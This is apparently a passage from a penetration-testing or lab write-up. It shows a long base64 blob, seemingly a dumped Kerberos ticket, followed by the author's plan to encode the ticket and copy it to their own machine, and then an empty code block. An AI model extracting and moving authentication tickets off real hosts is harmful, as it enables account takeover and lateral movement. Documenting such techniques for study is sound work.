kZqOgqGvgBocLZCWOUQR55nlWd+ZSa8AZsfdeaVLaq6FCiqf2JU7m4z0keyIzEbBgjwfgpgubRFx
Y4pzcbGJ5NgemDY6ykggVsAHRtoP8rAD+tx+a0myL5KbFEjZ+8+iPka5AdNu5fmD1SKNsYNe1kp9
SsINT+2EFEgNKMf7Is2TzEcOMjH4bxXww7c4OHvTnKr9PkCoS/0jXLWeZJfgGW46kuNf9YGeq3zz
z6l0BZamkr2P4y8vCLj9oWjklmMC2CGvZyo4qOn0VzIbkjPp7y/nek04X9UALypVU2Wx4wIVVvN4
qKb5TM8jzX3rEkj/JDKphdvQea6zVJDDj+n+sJOuux+n0jgHufH4UN3DBKsPmU8nrW/D7GBs7xpQ
giOii6HuQAQTmc6JLjMWUGDYX+cwxLoyudYNVjrztPV48AcqipeaM3PJ8D5hgbAiqRSoWcHA7dsd
DTIruDxHsVFkudmHVZibpecHBp+xbXgDKvKo7zHYXGjlTVaaReTejZpPJwHHZ2RWIb35se07JFQ7
MWtaTY6N7UdEZzzsjPpL1KqezJBJJErIWJQo9fUwAhvWsE0I7bZkFL5fNPJrKPdzPDY6s7N8H8yO
KtBLRpPy+ilrmoyJGKTlv2bYW/bxJ/SS0fdGMwBYptAEDc5Qv7aruSDXwla9vQui0EozqXRsD/jK
1UzNDqgBRLaGWvLSAjjf/FzmufwwL4+6GPaLlf8m8A08XTQGfTtgf21XDfEZ8a8X4SsFpdRtdZ0j
D46CE3DGBnZEu/MkTzqbVUQLnprC28Hl5ZkbAQgIDr7KSHO4MkDjnQvQenlan7td2L+VKYMShmyA
e5ih0/fvzU12sRLlzYqGpBFb/P6A7TG/M61S/qKlAUd6PNXZbdqDdphSSimL1l4OCif6IVqjYwSy
ubw7FKeT4Xl7/1OGx+R6bcAvwY4MEtPeMUDJQb4tZ9Yg0QqOuMR5wcxdwLywF6iI1uWuSsU1Jg49
fKHjetcxwpZ/H4r2s7ONPOvKLwc5DAFPZYHwTAzJtaL4dfUuFneTWH/KkDilc6sxKUFAO/QNe5V9
59F2JCA/Yo9ZsrlNLlIJNi7mI/bymj2zcHAEt4c3MMbVjFqBYafacLbMgIdZUg81GseSiEUlW4en
U6iRSXfdXBFrRECBluoyNK8J1Ezp6LYqTaawOEJp15xmb9in+HAI5k9aSHsl9avbOhHxi39kr5ZY
iEJKfnyzVYZdcvZhGLNGlKLCvfN7riCDyzhVw816301Ng/2hhHLjD3oQ3YOmBEiLQp+ynS5jWfLi
Dgr/wNgu2w9rS/xYeGwst3sWimmMNDvxG9U4o6H9uyjIVQJNzO+brmPwcdhu4EMhrfSbrfJ+bzqV
VW8PqTDR5DdIAytV4aoYDgxbE+511Iv95sQWgbqJ2KvW/e+r6ExeKTk1bq07ZOIH4gkUb34GtzE3
JCQQ35kWYk0ob8VoBv4X7y+mR86FH8XkFLb5fJqGkfYhGlrysvNisD6KUSpNsyMLmb8AAAAA
```

Ill encode the output of the ticket in base64 then output it to the screen, ill then copy this to my machine making sure the ticket is on ONE line

```python

```



